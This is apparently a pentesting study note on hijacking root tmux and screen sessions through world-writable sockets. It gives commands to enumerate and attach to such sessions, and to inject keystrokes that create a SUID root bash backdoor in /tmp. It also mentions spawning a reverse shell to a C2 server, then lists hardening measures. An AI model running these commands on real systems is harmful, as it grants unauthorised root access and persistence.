---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.30 Tmux Screen Hijacking"
---

# 44.30 Tmux and Screen Session Hijacking

## 1. Introduction

Terminal multiplexers like `tmux` (Terminal Multiplexer) and `screen` are essential utilities for system administrators, developers, and DevOps engineers. They allow users to run multiple terminal sessions within a single window, detach from them, and reattach later without interrupting the running processes. This is heavily relied upon for long-running tasks, such as server updates, database migrations, or persistent background monitoring.

However, the power of persistent, detachable sessions introduces significant security risks. If a privileged user (e.g., `root`) initiates a `tmux` or `screen` session and misconfigures the socket permissions, or if an attacker compromises a user account that shares a group with administrators, it may be possible to hijack these active sessions. Session hijacking grants the attacker immediate, unauthenticated access to the shell running inside the multiplexer, inheriting the privileges, environment variables, and active state of the original user.

## 2. Architecture and Attack Flow

The underlying mechanism of terminal multiplexers relies on Unix domain sockets or named pipes to communicate between the client (your terminal) and the background server process maintaining the session. 

The following ASCII diagram illustrates how misconfigured sockets lead to session hijacking:

```text
+-----------------------------------------------------------------------------+
|                          Linux System                                       |
|                                                                             |
|  +--------------------+                                                     |
|  | Root User Admin    |                                                     |
|  | (Starts tmux /     | 1. Creates persistent session                       |
|  |  screen session)   | ------------------------------+                     |
|  +--------------------+                               |                     |
|            |                                          v                     |
|            | 2. Socket file created     +--------------------------------+  |
|            |    (Misconfigured Perms)   | Unix Domain Socket             |  |
|            v                            | e.g., /tmp/tmux-0/default      |  |
|  +--------------------+                 |       /var/run/screen/S-root/  |  |
|  | File System        |                 | Permissions: srwxrwxrwx (777)  |  |
|  |                    |                 +--------------------------------+  |
|  +--------------------+                               ^                     |
|            ^                                          |                     |
|            | 3. Attacker discovers                    |                     |
|            |    socket file                           |                     |
|  +--------------------+                               |                     |
|  | Unprivileged User  | 4. Connects to socket using   |                     |
|  | (Attacker Shell)   |    tmux/screen client         |                     |
|  |                    | ------------------------------+                     |
|  +--------------------+                                                     |
|            |                                                                |
|            | 5. Hijack successful!                                          |
|            v                                                                |
|  +--------------------+                                                     |
|  | Root Shell Access  |                                                     |
|  | (Interactive &     |                                                     |
|  |  Unauthenticated)  |                                                     |
|  +--------------------+                                                     |
+-----------------------------------------------------------------------------+
```

## 3. The 'Why': Understanding the Vulnerability

Why do `tmux` and `screen` sessions become vulnerable to hijacking?

1.  **Shared Sockets (`tmux -S`):** Administrators sometimes intentionally share a `tmux` session for collaborative troubleshooting. They might start `tmux` with a custom socket using the `-S` flag and place it in `/tmp` with `chmod 777` to allow colleagues to join. Once troubleshooting is done, they often forget to close the session or delete the socket, leaving a wide-open root shell.
2.  **Insecure `umask`:** If a user's `umask` is overly permissive (e.g., `000` or `002`), newly created files—including sockets—might be generated with read and write permissions for groups or all users.
3.  **Group Membership:** In environments utilizing `screen`'s `multiuser` mode, access is often granted based on Unix groups. If an attacker compromises a low-privileged account that happens to be in the allowed group (e.g., `wheel`, `admins`, or `devs`), they can seamlessly attach to the administrator's screen session.

## 4. Exploiting `screen` Sessions

GNU `screen` is the older of the two utilities but is still ubiquitous on legacy Linux systems. It uses sockets typically located in `/run/screen/`, `/var/run/screen/`, or `/tmp/screens/`.

### 4.1 Identifying Vulnerable Screen Sessions

First, search for running `screen` processes to see if any are active under high-privileged users.

```bash
ps aux | grep -i screen
```

Next, search the file system for screen socket directories and check their permissions.

```bash
# Look for screen directories
ls -la /var/run/screen/
ls -la /tmp/screens/

# Advanced find to look for sockets we have read/write access to
find / -type s -name "*screen*" -writable -exec ls -la {} + 2>/dev/null
```

A target directory might look like this:
`drwxrwxrwx 2 root root 4096 Jun 9 10:00 S-root`

Inside `S-root`, there will be a socket file, for example, `12345.pts-0.hostname`.

### 4.2 Hijacking the Screen Session

If the socket or the directory permissions allow your user to interact with it, you can attach to the session. 

```bash
# General format to attach to someone else's screen
screen -r <username>/<session_id>

# Example: Attaching to root's session using the full path
screen -S root/12345.pts-0.hostname -r

# Or, if multi-user mode is explicitly enabled and you are authorized
screen -x root/
```
Once attached, you will instantly share the terminal with the administrator. *Caution: Anything you type will be visible to the administrator if they are currently viewing the terminal.* To avoid detection, penetration testers often wait until the terminal is idle or execute commands extremely quickly.

## 5. Exploiting `tmux` Sessions

`tmux` is the modern successor to `screen` and is the default on many modern distributions. It uses a slightly different architecture but is susceptible to the exact same logic flaws.

### 5.1 Identifying Vulnerable Tmux Sessions

Look for active `tmux` server processes running as `root` or other targets.

```bash
ps aux | grep -i tmux
```

`tmux` normally creates its sockets in `/tmp/tmux-<UID>/` (e.g., `/tmp/tmux-0/` for root). However, custom sockets are often placed directly in `/tmp/` or `/var/tmp/`.

```bash
# Check default locations
ls -la /tmp/tmux-*/

# Find all socket files owned by root that are writable by others
find / -type s -user root -writable -exec ls -la {} + 2>/dev/null
```

You are looking for sockets with permissive rights, e.g., `srw-rw-rw-` or `srwxrwxrwx`.

### 5.2 Hijacking the Tmux Session

If you find a writable `tmux` socket, you can use the `-S` parameter to specify the socket path and attach to the session.

```bash
# Attach to a tmux session via a misconfigured socket
tmux -S /tmp/tmux-0/default attach-session

# Or for a custom shared socket
tmux -S /tmp/shared_debug_session attach
```

Like `screen`, attaching drops you immediately into the target's shell context. If the shell was spawned by `root`, you now have root execution.

## 6. Advanced Techniques: Silent Execution

Interacting visibly with a hijacked session can alert a logged-in administrator. A stealthier approach is to use the terminal multiplexer's command-line interface to execute commands inside the session *without* attaching to it visually.

### 6.1 Silent Command Execution in `tmux`

You can send keystrokes or commands directly to the `tmux` session.

```bash
# Send a command to the target tmux socket and execute it
tmux -S /tmp/tmux-0/default send-keys "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" Enter
```
This perfectly executes the command in the background of the target's shell, creating a SUID backdoor without ever taking over the UI.

### 6.2 Silent Command Execution in `screen`

Screen allows sending commands via the `-X` flag.

```bash
# Inject commands into the screen session
screen -S root/12345.pts-0 -X stuff "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n"
```
The `stuff` command literally "stuffs" the string into the input buffer of the screen window, and `\n` acts as the Enter key.

## 7. Real-World Penetration Testing Scenario

During a red team engagement, you gain access to an application server as the `www-data` user.
1.  **Process Enumeration:** Running `ps aux`, you notice a `root` process running `tmux -S /tmp/db_migration`.
2.  **File System Checks:** You check the permissions of the socket: `ls -la /tmp/db_migration`. The output is `srwxrwxrwx 1 root root 0 Jun 9 14:00 /tmp/db_migration`. The administrator mistakenly granted full permissions.
3.  **Exploitation:** You type `tmux -S /tmp/db_migration attach`.
4.  **Action on Objective:** You are instantly dropped into a root shell where a long-running database migration script is paused. You quickly spawn a reverse shell to your C2 server and detach from the `tmux` session (`Ctrl+b, d`) to leave the original session undisturbed.

## 8. Defensive Hardening & Mitigation

To secure terminal multiplexers:
1.  **Strict Socket Permissions:** Never use `chmod 777` on sockets. If sharing is required, restrict permissions using strict Group access (e.g., `chmod 770`) and ensure only highly trusted users are in that group.
2.  **Proper `umask`:** Ensure system-wide and root `umask` is set securely (e.g., `027` or `077`) so default creations are not globally readable/writable.
3.  **Terminate Stale Sessions:** Implement idle timeouts (`TMOUT`) and establish policies to kill abandoned `tmux` or `screen` sessions.
4.  **Avoid Shared Sessions for Admin Tasks:** Utilize alternative auditing and collaboration tools (like `script` or centralized logging) rather than sharing live root shells via multiplexers.

## Chaining Opportunities
- Gain initial shell access via **[[02 - Web Application RCE]]** and immediately look for active multiplexers.
- Use hijacked sessions to steal credentials or SSH keys as described in **[[08 - SSH Hijacking and Key Theft]]**.
- Create persistence mechanisms (**[[12 - SUID Executable Exploitation]]**) directly from the hijacked session.

## Related Notes
- [[19 - Linux Process Enumeration]]
- [[35 - Defense File Permission Hardening]]
- [[09 - Environmental Variable Manipulation]]
